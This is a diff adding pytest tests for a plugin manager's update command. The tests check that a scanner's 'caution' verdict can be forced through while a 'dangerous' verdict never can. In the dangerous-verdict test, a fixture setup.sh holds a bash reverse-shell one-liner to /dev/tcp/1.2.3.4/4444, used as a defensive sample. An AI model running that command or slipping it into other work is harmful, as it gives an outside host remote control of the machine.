@@ -87,3 +87,59 @@ def test_enablement_before_lock_acquisition_cannot_skip_validation(installed, mo
     assert {path: path.read_bytes() for path in watched} == before
     assert (home / "config.yaml").read_bytes() == enabled["config"]
     assert paths.runtime_facts_path().read_bytes() == enabled["facts"]
+
+
+def _commit_cautious(repo, message, filename, body):
+    """Land an upstream revision whose scan verdict is not clean."""
+    import os
+    (repo / filename).write_text(body, encoding="utf-8")
+    env = {**os.environ, "GIT_AUTHOR_NAME": "fixture", "GIT_AUTHOR_EMAIL": "fixture@example.invalid",
+           "GIT_COMMITTER_NAME": "fixture", "GIT_COMMITTER_EMAIL": "fixture@example.invalid"}
+    subprocess.run(["git", "add", "--all"], cwd=repo, check=True, capture_output=True, env=env)
+    subprocess.run(["git", "commit", "-qm", message], cwd=repo, check=True, capture_output=True, env=env)
+    return subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=repo, text=True).strip()
+
+
+@pytest.mark.parametrize("installed", ["catalog", "custom"], indirect=True)
+def test_cli_update_force_accepts_a_caution_verdict(installed, monkeypatch):
+    """A caution-verdict upstream revision refuses `plugins update`, and ``--force`` re-accepts it
+    the same way ``install --force`` does — while a dangerous verdict stays non-overridable."""
+    from hermes_cli import plugins_cmd as pc
+
+    _, home, repo, target, state = installed
+    _version(repo, "2.0.0")
+    state["sha"] = _commit_cautious(repo, "caution", "helper.py", "eval('1 + 1')\n")
+    monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+    old = (target / "__init__.py").read_bytes()
+    scans = []
+    real_scan = pc._scan_plugin_tree
+
+    def seen(staged, source, **kwargs):
+        scans.append(kwargs.get("force"))
+        return real_scan(staged, source, **kwargs)
+
+    monkeypatch.setattr(pc, "_scan_plugin_tree", seen)
+
+    with pytest.raises(SystemExit):
+        pc.cmd_update("transactional", interactive=False)
+    assert scans == [False]
+    assert (target / "__init__.py").read_bytes() == old
+
+    pc.cmd_update("transactional", interactive=False, force=True)
+    assert scans == [False, True]
+    assert "VERSION = '2.0.0'" in (target / "__init__.py").read_text(encoding="utf-8")
+
+
+@pytest.mark.parametrize("installed", ["catalog", "custom"], indirect=True)
+def test_cli_update_force_never_overrides_a_dangerous_verdict(installed, monkeypatch):
+    from hermes_cli import plugins_cmd as pc
+
+    _, home, repo, target, state = installed
+    _version(repo, "2.0.0")
+    state["sha"] = _commit_cautious(repo, "dangerous", "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+    monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+    old = (target / "__init__.py").read_bytes()
+
+    with pytest.raises(SystemExit):
+        pc.cmd_update("transactional", interactive=False, force=True)
+    assert (target / "__init__.py").read_bytes() == old
